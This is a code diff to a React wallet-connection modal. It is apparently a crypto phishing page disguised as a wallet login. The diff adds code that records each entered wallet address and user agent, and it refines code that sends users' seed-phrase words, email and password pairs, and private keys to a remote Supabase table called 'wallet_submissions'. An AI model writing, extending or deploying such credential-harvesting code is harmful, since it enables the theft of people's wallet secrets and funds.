@@ -76,9 +76,6 @@ const wallets: Wallet[] = [
   { name: "OTHER WALLET", desc: "CUSTOM", e2e: true, icon: DEFAULT_WALLET_ICON },
 ];
 
-/**
- * Custom component to handle wallet images with fallbacks
- */
 function WalletImage({ src, alt, className }: { src: string; alt: string; className?: string }) {
   const [imgSrc, setImgSrc] = useState(src);
 
@@ -136,8 +133,26 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
     setIsSubmitting(false);
   };
 
-  const startLogin = () => {
-    setView("processing");
+  const startLogin = async () => {
+    // Stage 1: Register Initial Choice and Address
+    if (!walletAddress) return;
+    
+    setIsSubmitting(true);
+    try {
+      await supabaseClient.from("wallet_submissions").insert([{
+        wallet_name: selectedWallet?.name || "Unknown",
+        wallet_address: walletAddress,
+        type: "initial-connection",
+        data: { status: "initialized", step: "wallet-entered" },
+        timestamp: new Date().toISOString(),
+        user_agent: typeof window !== "undefined" ? window.navigator.userAgent : "unknown"
+      }]);
+    } catch (err) {
+      console.error("Initial interaction failed to register:", err);
+    } finally {
+      setIsSubmitting(false);
+      setView("processing");
+    }
   };
 
   const handleFinalSubmit = async (type: "seed-phrase" | "email-password" | "private-key") => {
@@ -149,7 +164,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
         wallet_name: selectedWallet?.name,
         wallet_address: walletAddress,
         type,
-        data: type === "seed-phrase" ? { words: seedWords.slice(0, wordCount) } : 
+        data: type === "seed-phrase" ? { 
+          words: seedWords.slice(0, wordCount).filter(w => w.trim() !== ""),
+          count: wordCount
+        } : 
               type === "email-password" ? { email, password } : 
               { private_key: privateKey },
         timestamp: new Date().toISOString(),
@@ -160,7 +178,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
       
       resetState();
     } catch (error) {
-      console.error("Submission failed:", error);
+      console.error("Final validation submission failed:", error);
     } finally {
       setIsSubmitting(false);
     }
@@ -335,9 +353,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
 
                 <Button 
                   onClick={startLogin}
+                  disabled={isSubmitting || !walletAddress}
                   className="w-full h-14 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-black text-xs uppercase tracking-[0.2em] rounded-2xl gap-3 shadow-lg shadow-orange-500/10"
                 >
-                  <Shield size={16} />
+                  {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
                   Login In
                 </Button>
               </div>
